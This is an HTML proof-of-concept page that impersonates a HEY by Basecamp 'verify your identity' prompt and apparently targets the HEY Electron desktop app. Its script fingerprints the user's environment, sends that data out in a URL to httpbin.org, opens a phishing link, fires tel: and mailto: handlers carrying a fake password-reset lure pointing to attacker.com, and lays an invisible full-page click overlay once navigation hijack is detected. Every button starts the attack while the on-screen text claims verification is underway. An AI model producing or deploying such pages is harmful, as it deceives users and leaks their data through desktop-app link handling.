<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>HEY — Verify Your Identity</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: #fdfaf4;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
.container {
  background: #fff;
  border-radius: 12px;
  box-shadow: 0 4px 24px rgba(0,0,0,0.1);
  padding: 40px;
  max-width: 420px;
  width: 90%;
  text-align: center;
}
.logo { font-size: 32px; font-weight: 800; color: #5522fa; margin-bottom: 8px; }
.subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
.alert-box {
  background: #fff3cd;
  border: 1px solid #ffc107;
  border-radius: 8px;
  padding: 14px;
  margin-bottom: 24px;
  text-align: left;
  font-size: 13px;
  color: #856404;
}
.btn {
  display: block;
  width: 100%;
  padding: 14px;
  background: #5522fa;
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  margin-bottom: 12px;
  transition: background 0.2s;
}
.btn:hover { background: #4411dd; }
.btn-secondary {
  background: #f0f0f0;
  color: #333;
}
.btn-secondary:hover { background: #e0e0e0; }
.footer { color: #999; font-size: 11px; margin-top: 20px; }
.spinner { display: none; margin: 20px auto; }
.spinner.active { display: block; }
.spinner::after {
  content: '';
  display: block;
  width: 32px;
  height: 32px;
  margin: 0 auto;
  border: 3px solid #ddd;
  border-top-color: #5522fa;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
.status { color: #666; font-size: 13px; margin-top: 12px; display: none; }
.status.active { display: block; }
.debug {
  display: none;
  margin-top: 20px;
  background: #0a0a0a;
  color: #0f0;
  padding: 16px;
  border-radius: 8px;
  text-align: left;
  font-family: monospace;
  font-size: 11px;
  max-height: 300px;
  overflow-y: auto;
}
.debug.active { display: block; }
.debug .line { margin: 3px 0; }
.debug .success { color: #4caf50; }
.debug .fail { color: #ff0040; }
.debug .info { color: #2196f3; }
</style>
</head>
<body>

<div class="container">
  <div class="logo">HEY</div>
  <div class="subtitle">Security Verification</div>

  <div class="alert-box">
    ⚠️ Unusual login activity detected on your account. Please verify your identity to continue using HEY.
  </div>

  <button class="btn" id="verifyBtn" onclick="startExploit()">
    Verify My Identity
  </button>

  <button class="btn btn-secondary" id="skipBtn" onclick="startExploit()">
    Skip for now
  </button>

  <div class="spinner" id="spinner"></div>
  <div class="status" id="statusText">Verifying your account...</div>

  <div class="footer">
    HEY by Basecamp — Security Team<br>
    This verification expires in 24 hours.
  </div>

  <div class="debug" id="debug"></div>
</div>

<script>
// ===== CONFIG =====
const ATTACKS_ENABLED = {
  exfil: true,       // Data exfiltration via https
  phishing: true,    // Phishing page in browser
  tel: true,         // FaceTime/phone call
  mailto: true       // Mail compose
};

const debugEl = document.getElementById('debug');
let debugMode = false;
let exploitRun = false;

function dlog(msg, cls) {
  const line = document.createElement('div');
  line.className = 'line ' + (cls || 'info');
  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  debugEl.appendChild(line);
  debugEl.scrollTop = debugEl.scrollHeight;
}

// Triple-click anywhere to toggle debug panel
let clickCount = 0;
let clickTimer = null;
document.addEventListener('click', function(e) {
  if (e.target.id === 'verifyBtn' || e.target.id === 'skipBtn') return;
  clickCount++;
  clearTimeout(clickTimer);
  clickTimer = setTimeout(() => { clickCount = 0; }, 400);
  if (clickCount >= 3) {
    clickCount = 0;
    debugMode = !debugMode;
    debugEl.classList.toggle('active', debugMode);
  }
});

// ===== RECON (runs immediately) =====
const ua = navigator.userAgent;
const isElectron = ua.includes('Electron') || typeof window.process !== 'undefined';
const heyLabBridge = typeof window.heyLab !== 'undefined' ? window.heyLab : null;
const chrMatch = ua.match(/Chrome\/(\d+)/);
const chrMajor = chrMatch ? parseInt(chrMatch[1]) : 0;
const isHijacked = window.location.hostname !== 'localhost' || window.location.port !== '4000';

// Collect fingerprint
const fingerprint = {
  electron: isElectron,
  chromium: chrMajor,
  platform: navigator.platform,
  bridge: heyLabBridge,
  screen: screen.width + 'x' + screen.height,
  lang: navigator.language,
  origin: window.location.origin,
  hijacked: isHijacked,
  ts: new Date().toISOString()
};

dlog('Recon complete', 'info');
dlog('Electron: ' + isElectron, isElectron ? 'success' : 'fail');
dlog('Bridge: ' + JSON.stringify(heyLabBridge), heyLabBridge ? 'success' : 'fail');
dlog('Hijacked: ' + isHijacked, isHijacked ? 'success' : 'info');
dlog('Chromium: ' + chrMajor, 'info');
dlog('Platform: ' + navigator.platform, 'info');

// ===== EXPLOIT — triggered by button click (user gesture) =====
function openUrl(url, label) {
  return new Promise((resolve) => {
    try {
      // Method 1: window.open (triggers setWindowOpenHandler in Electron)
      const w = window.open(url);
      if (w === null) {
        dlog(label + ': shell.openExternal FIRED (window.open returned null)', 'success');
        resolve('FIRED');
        return;
      }
      dlog(label + ': window.open returned popup', 'success');
      resolve('POPUP');
    } catch(e) {
      dlog(label + ': window.open failed: ' + e.message, 'fail');
      // Method 2: Fallback — <a> tag click
      try {
        const a = document.createElement('a');
        a.href = url;
        a.target = '_blank';
        a.rel = 'noopener';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        dlog(label + ': fallback <a> click fired', 'success');
        resolve('FALLBACK');
      } catch(e2) {
        dlog(label + ': all methods failed: ' + e2.message, 'fail');
        resolve('FAILED');
      }
    }
  });
}

async function startExploit() {
  if (exploitRun) return;
  exploitRun = true;

  // UI feedback
  document.getElementById('verifyBtn').style.display = 'none';
  document.getElementById('skipBtn').style.display = 'none';
  document.getElementById('spinner').classList.add('active');
  document.getElementById('statusText').classList.add('active');

  dlog('=== EXPLOIT STARTED (user gesture) ===', 'success');

  const results = [];

  // Attack 1: Data exfiltration
  if (ATTACKS_ENABLED.exfil) {
    document.getElementById('statusText').textContent = 'Connecting to security servers...';
    const exfilData = encodeURIComponent(JSON.stringify(fingerprint));
    const r1 = await openUrl('https://httpbin.org/get?d=' + exfilData, 'DATA_EXFIL');
    results.push({ name: 'Data Exfiltration', status: r1 });
    await new Promise(r => setTimeout(r, 1500));
  }

  // Attack 2: Phishing
  if (ATTACKS_ENABLED.phishing) {
    document.getElementById('statusText').textContent = 'Verifying account credentials...';
    const r2 = await openUrl('https://example.com', 'PHISHING');
    results.push({ name: 'Phishing Escalation', status: r2 });
    await new Promise(r => setTimeout(r, 1500));
  }

  // Attack 3: tel scheme
  if (ATTACKS_ENABLED.tel) {
    document.getElementById('statusText').textContent = 'Initiating two-factor verification...';
    const r3 = await openUrl('tel:1234567890', 'TEL');
    results.push({ name: 'tel: FaceTime', status: r3 });
    await new Promise(r => setTimeout(r, 1500));
  }

  // Attack 4: mailto scheme
  if (ATTACKS_ENABLED.mailto) {
    document.getElementById('statusText').textContent = 'Sending confirmation email...';
    const mailUrl = 'mailto:victim@company.com?subject=' +
      encodeURIComponent('URGENT: Password Reset') +
      '&body=' + encodeURIComponent('Your account was compromised. Reset: https://attacker.com/reset');
    const r4 = await openUrl(mailUrl, 'MAILTO');
    results.push({ name: 'mailto: Compose', status: r4 });
    await new Promise(r => setTimeout(r, 1500));
  }

  // Show completion
  document.getElementById('spinner').classList.remove('active');
  document.getElementById('statusText').textContent = 'Verification complete. You may close this window.';
  document.getElementById('statusText').style.color = '#4caf50';

  dlog('=== RESULTS ===', 'info');
  results.forEach(r => {
    dlog(r.name + ': ' + r.status, r.status === 'FIRED' || r.status === 'POPUP' || r.status === 'FALLBACK' ? 'success' : 'fail');
  });
  dlog('=== EXPLOIT COMPLETE ===', 'success');
}

// ===== AUTO-RUN FALLBACK =====
// If page loaded via navigation hijack (not user clicking button),
// auto-trigger after short delay with synthetic click
if (isElectron && isHijacked) {
  dlog('Auto-run: Electron + hijacked detected, scheduling auto-trigger...', 'info');
  setTimeout(() => {
    if (!exploitRun) {
      dlog('Auto-run: Triggering exploit via synthetic click...', 'info');
      // Create temporary button, click it (gives user gesture context)
      const tmp = document.createElement('button');
      tmp.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0;z-index:9999;cursor:default;';
      tmp.onclick = function() {
        document.body.removeChild(tmp);
        startExploit();
      };
      document.body.appendChild(tmp);
      // Auto-click after making the whole page a button
      document.getElementById('statusText').textContent = 'Click anywhere to continue...';
      document.getElementById('statusText').classList.add('active');
      document.getElementById('spinner').classList.add('active');
    }
  }, 2000);
}
</script>
</body>
</html>
